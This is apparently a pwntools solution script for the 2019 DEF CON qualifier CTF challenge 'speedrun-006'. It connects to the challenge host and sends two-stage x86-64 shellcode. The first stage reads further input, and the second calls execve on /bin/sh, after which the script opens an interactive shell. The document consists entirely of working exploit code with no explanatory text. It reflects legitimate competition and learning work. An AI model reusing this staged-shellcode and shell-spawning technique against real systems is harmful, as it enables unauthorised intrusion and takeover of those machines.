from pwn import *

p = remote('speedrun-006.quals2019.oooverflow.io', 31337)
# p = process('./speedrun-006')/

p.recvuntil('ride')

pause()

         # xor eax, 0x3b;
         # add ebx, 0x1;
         # add ecx, 0x1;
         # lea rdi, [rip + 0x42424242];
         # syscall;

shc = asm('''
          syscall;
          mov rdx, 0x1010101;
          xchg rcx, rsi;
          syscall;
          ''', arch='amd64', os='linux')

print('shc', shc)
print(len(shc))
p.send(shc.ljust(26, 'A'))

sleep(0.5)

shc = asm('''
          xchg rdi, rsi;
          mov rax, 0x3b;
          mov rdx, 0;
          syscall;
          ''', arch='amd64', os='linux')


p.send('/bin/sh\x00' + 'A' * 0x6 + shc)

p.interactive()
